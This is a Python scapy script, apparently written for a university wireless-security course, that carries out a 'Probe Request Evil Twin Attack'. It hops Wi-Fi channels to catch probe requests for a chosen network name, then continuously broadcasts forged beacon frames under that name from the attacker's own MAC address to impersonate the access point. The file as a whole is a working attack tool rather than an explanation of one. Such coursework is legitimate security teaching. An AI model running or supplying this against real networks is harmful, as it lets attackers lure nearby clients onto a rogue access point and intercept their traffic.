#!/usr/bin/python3
from scapy.all import *
import pandas
import time
from threading import Thread
from uuid import getnode as get_mac
import argparse

myMac = ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))

# Devices which are known to be constantly probing
IGNORE_LIST = set(['00:00:00:00:00:00', '01:01:01:01:01:01'])
SEEN_DEVICES = set()  # Devices which have had their probes received
d = {'00:00:00:00:00:00': 'Example MAC Address'}  # Dictionary of all named devices
# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)
mac = []

def handle_packet(pkt):
    if not pkt.haslayer(Dot11ProbeReq):
        return

    if pkt.type == 0 and pkt.subtype == 4:  # subtype used to be 8 (APs) but is now 4 (Probe Requests)
        if pkt.addr2 not in IGNORE_LIST:  # If not registered as ignored
            if pkt[Dot11Elt].info.decode() == ssid_to_find:
                mac.append(pkt.addr2)


def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        ch = ch % 13 + 1
        time.sleep(0.5)
        if endChange == 1:
            break

def fakeAccessPoint():
    # SSID (name of access point)

    ssid = ssid_to_find

    # 802.11 frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=myMac, addr3=myMac)
    # beacon layer
    beacon = Dot11Beacon(cap="ESS+privacy")
    # putting ssid in the frame
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    # stack all the layers and add a RadioTap
    frame = RadioTap() / dot11 / beacon / essid
    # send the frame in layer 2 every 100 milliseconds forever
    # using the `iface` interface
    sendp(frame, inter=0.1, iface=interface, loop=1, verbose=0)


def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # get the crypto
        crypto = stats.get("crypto")
        networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)


def print_all():
    print(networks.iloc[:, 0:1])

if __name__ == '__main__':
    # check admin privileges
    if not os.getuid() == 0:
        print("Permission denied. Try running this script with sudo.")
        exit()    
    
    # parse arguments
    parser = argparse.ArgumentParser(
        description="Probe Request Evil Twin Attack",
        epilog="This script was developped as an exercise for the SWI course at HEIG-VD")
        
    parser.add_argument("interface", help="Interface to use")
    args = parser.parse_args()

    # interface name, check using iwconfig
    interface = args.interface
    endChange = 0

    # Welcome
    print("WELCOME")
    print(myMac)
    time.sleep(0.2)
    print()
    print("We are going to scan probe on all channel !!!")
    time.sleep(0.2)

    # Start the channel changer
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()

    # Ask which SSID to find:
    print()
    ssid_to_find = input("Enter the SSID you want to find: ")
    print()

    # SNIFFING
    while True:
        print("SNIFFING FOR 10s to find: ", ssid_to_find)
        sniff(iface=interface, prn=handle_packet, timeout=10)  # start sniffin
        if len(mac) != 0:
            print("SSID:", ssid_to_find, "found with MAC:", mac[0])
            break
        print("Nothing found, retry")
    endChange = 1
    channel_changer.join()

    print()
    new_channel = input("Choose new channel: ")
    new_channel = int(new_channel)

    # Fake SSID Start
    print()
    print("Attack of SSID: ", ssid_to_find)
    print("On Channel: ", new_channel)
    os.system(f"iwconfig {interface} channel {new_channel}")
    fakeAP = Thread(target=fakeAccessPoint)
    fakeAP.daemon = True
    fakeAP.start()
    time.sleep(0.2)

    # CHECK WITH SNIFF
    while True:
        print()
        print("Emptying list of SSID...")
        time.sleep(0.2)
        print()
        networks = networks.iloc[0:0]
        print("Wait 10s to see if your attack still works on Channel: ", new_channel)
        sniff(prn=callback, iface=interface, timeout=10)
        print()
        time.sleep(0.2)
        print_all()
        time.sleep(0.2)
        print()